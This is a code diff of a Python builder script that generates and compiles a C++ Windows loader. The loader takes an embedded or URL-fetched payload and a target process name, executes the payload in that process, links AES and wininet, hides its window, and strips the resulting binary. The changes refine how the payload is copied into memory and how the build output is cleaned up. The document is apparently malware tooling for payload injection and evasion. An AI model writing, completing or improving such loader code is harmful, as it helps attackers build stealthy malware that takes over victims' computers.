@@ -42,7 +42,7 @@ using namespace std;
 int main()
 {{
     PBYTE pPayloadAddress;
-    DWORD pPayloadSize;
+    SIZE_T pPayloadSize;
     string Url = "{Url}";
     LPWSTR szProcessName = L"{ProcessName}";
     DWORD dwProcessID;
@@ -62,8 +62,14 @@ int main()
 
     if Payload != "null":
         f.write(f"""\n
-    pPayloadSize = sizeof(Data_RawData);
-    pPayloadAddress = Data_RawData;
+    pPayloadSize = {len(Payload)};
+    pPayloadAddress = (PBYTE)malloc(pPayloadSize);
+    if (pPayloadAddress == NULL)
+    {{
+        printf("Memory allocation failed.\\n");
+        return 1;
+    }}
+    memcpy(pPayloadAddress, Data_RawData, pPayloadSize);
 """)
 
     if Url != "null":
@@ -103,6 +109,8 @@ int main()
         printf("Failed to execute payload");
         return 0;
     }}
+            
+    free(pPayloadAddress);
    
     // Just for testing purposes (TO REMOVE)
 	WaitForSingleObject(*phThread, INFINITE);
@@ -112,7 +120,9 @@ int main()
 
     f.close()
     time.sleep(2)
-    return os.system(f"g++ --static -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
+    build = os.system(f"g++ --static -g -O2 -w -s -DNO_WINTERNL -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
+    os.system(f"strip -o  {Path}.exe {Path}.exe")
+    return build
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-DNO_WINTERNL', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
